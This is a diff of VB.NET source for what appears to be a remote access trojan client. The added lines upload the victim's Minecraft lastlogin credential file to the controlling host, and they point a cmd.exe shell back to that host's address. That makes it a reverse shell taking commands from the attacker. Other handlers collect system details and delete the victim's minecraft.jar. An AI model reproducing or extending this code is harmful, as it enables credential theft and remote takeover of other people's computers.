@@ -41,29 +41,6 @@ Public Class Form1
                             Dim commandd As String = c(My.Computer.Info.OSPlatform) & "|" & c(My.Computer.Info.OSVersion) & "|" & c(My.Computer.Info.TotalPhysicalMemory) & "|" & c(My.Computer.Info.TotalVirtualMemory) & "|" & c(My.Computer.Screen.DeviceName) & "|" & c(HardwareId) & "|" & c(My.Computer.Info.OSFullName)
                             w.WriteLine(commandd)
                             w.Flush()
-                        ElseIf s = "stealmc" Then
-                            Threading.Thread.Sleep(500)
-                            Dim lastlogin As String = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) & "\.minecraft\lastlogin"
-                            'Dim lastlogindata As String
-                            'If System.IO.File.Exists(lastlogin) = True Then
-                            'Using file As New IO.FileStream(lastlogin, IO.FileMode.Open)
-                            'Dim value As Integer = File.ReadByte()
-                            ' Do Until value = -1
-                            'lastlogindata = lastlogindata & value.ToString("X2")
-                            '
-                            'value = File.ReadByte()
-                            ' Loop
-                            'End Using
-                            'End If
-                            'w.WriteLine(lastlogindata)
-                            'w.Flush()
-                            Dim networkStream As NetworkStream
-                            networkStream = client.GetStream()
-                            Dim fs As FileStream
-                            fs = New FileStream("D:\Users\Peter\AppData\Roaming\Untitled.png", FileMode.Open)
-                            Dim objReader As New BinaryReader(fs)
-                            Dim send() As Byte = objReader.ReadBytes(fs.Length)
-                            networkStream.Write(send, 0, send.Length)
                         ElseIf s = "mcremovejar" Then
                             Try
                                 Kill(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) & "\.minecraft\bin\minecraft.jar")
@@ -83,7 +60,7 @@ Public Class Form1
                                 If m(0) = "MSGBOX" Then
                                     MsgBox(m(3).Replace("<strich>", "|"), CInt(m(1)), m(2).Replace("<strich>", "|"))
                                 ElseIf m(0) = "STARTCMD" Then
-                                    cmd_client = New TcpClient("127.0.0.1", CInt(m(1)))
+                                    cmd_client = New TcpClient(client.Client.RemoteEndPoint.ToString().Split(":")(0), CInt(m(1)))
                                     With proc.StartInfo
                                         .FileName = "cmd.exe"
                                         '.Arguments = "/c cd c:\ "
@@ -94,6 +71,10 @@ Public Class Form1
                                     End With
                                     proc.Start()
                                     BackgroundWorker2.RunWorkerAsync()
+                                ElseIf m(0) = "stealmc" Then
+                                    Dim uploclie As New UploadClient()
+                                    Dim lastlogin As String = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) & "\.minecraft\lastlogin"
+                                    uploclie.UploadFile(CInt(m(1)), lastlogin, client.Client.RemoteEndPoint.ToString().Split(":")(0))
                                 ElseIf m(0) = "CMDSHELL" Then
                                     proc.StandardInput.WriteLine(m(1).Replace("<strich>", "|"))
                                     proc.StandardInput.Flush()
